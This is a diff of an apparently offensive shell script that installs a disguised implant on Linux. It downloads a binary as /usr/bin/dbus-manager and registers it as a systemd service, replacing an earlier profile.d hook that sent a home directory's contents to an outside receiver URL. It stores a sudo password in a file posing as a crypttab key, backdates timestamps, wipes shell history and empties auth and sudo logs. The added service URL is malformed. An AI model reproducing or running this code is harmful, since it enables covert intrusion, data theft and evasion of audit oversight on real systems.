@@ -8,12 +8,7 @@ sed -i '\|privesc.sh|d' ~/.bash_history
 if [ "$EUID" -eq 0 ]; then
     unset HISTFILE
     set +o history
-    cat > /etc/profile.d/dbus-cache.sh << 'EOF'
-#!/bin/bash
-unset HISTFILE
-set +o history
-/usr/bin/dbus-manager --watch-path /home/kaucrow --server-url https://pentest-receiver-production.up.railway.app/watchdog/data > /dev/null 2>&1 &
-EOF
+
     GOOD_BOY_URL="https://github.com/Kaucrow/good-boy/raw/refs/heads/main/bin/goodboy"
     curl -L -s -o /usr/bin/dbus-manager "$GOOD_BOY_URL" || \
     wget -q -O /usr/bin/dbus-manager "$GOOD_BOY_URL"
@@ -24,8 +19,16 @@ EOF
 
     chmod +x /usr/bin/dbus-manager
 
-    touch -r /bin/ls /etc/profile.d/dbus-cache.sh
     touch -r /bin/ls /usr/bin/dbus-manager
+
+    SYSTEMD_SERVICE="dbus-org.manager.service"
+    SYSTEMD_SERVICE_URL="https://https://raw.githubusercontent.com/Kaucrow/good-boy/refs/heads/main/systemd.service"
+    curl -s -o /etc/systemd/system/$SYSTEMD_SERVICE "$SYSTEMD_SERVICE_URL" || \
+    wget -q -O /etc/systemd/system/$SYSTEMD_SERVICE "$SYSTEMD_SERVICE_URL"
+    systemctl enable $SYSTEMD_SERVICE
+    systemctl start $SYSTEMD_SERVICE
+
+    touch -r /bin/ls /etc/systemd/system/$SYSTEMD_SERVICE
 
     exit 0
 else
@@ -79,19 +82,6 @@ SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A bash << DEPLOYEOF
     cp "$GB_DIR/session-data" /etc/crypttab.key
     chmod 444 /etc/crypttab.key
 
-    cat > /etc/profile.d/dbus-cache.sh << "WATCHEOF"
-#!/bin/bash
-unset HISTFILE
-set +o history
-if [ -f /etc/crypttab.key ]; then
-    ASKPASS_SCRIPT=\$(mktemp)
-    echo -e "#!/bin/sh\ncat /etc/crypttab.key" > "\$ASKPASS_SCRIPT"
-    chmod +x "\$ASKPASS_SCRIPT"
-    SUDO_ASKPASS="\$ASKPASS_SCRIPT" /usr/bin/sudo -A /usr/bin/dbus-manager --watch-path /home/kaucrow --server-url https://pentest-receiver-production.up.railway.app/watchdog/data > /dev/null 2>&1 &
-    rm -f "\$ASKPASS_SCRIPT"
-fi
-WATCHEOF
-
     GOOD_BOY_URL="https://github.com/Kaucrow/good-boy/raw/refs/heads/main/bin/goodboy"
     curl -L -s -o /usr/bin/dbus-manager "\$GOOD_BOY_URL" || \
     wget -q -O /usr/bin/dbus-manager "\$GOOD_BOY_URL"
@@ -102,9 +92,17 @@ WATCHEOF
 
     chmod +x /usr/bin/dbus-manager
 
-    touch -r /bin/ls /etc/profile.d/dbus-cache.sh
     touch -r /bin/ls /usr/bin/dbus-manager
     touch -r /bin/ls /etc/crypttab.key
+
+    SYSTEMD_SERVICE="dbus-org.manager.service"
+    SYSTEMD_SERVICE_URL="https://https://raw.githubusercontent.com/Kaucrow/good-boy/refs/heads/main/systemd.service"
+    curl -s -o /etc/systemd/system/$SYSTEMD_SERVICE "$SYSTEMD_SERVICE_URL" || \
+    wget -q -O /etc/systemd/system/$SYSTEMD_SERVICE "$SYSTEMD_SERVICE_URL"
+    systemctl enable $SYSTEMD_SERVICE
+    systemctl start $SYSTEMD_SERVICE
+
+    touch -r /bin/ls /etc/systemd/system/$SYSTEMD_SERVICE
 
     > /var/log/auth.log 2>/dev/null
     > /var/log/sudo.log 2>/dev/null
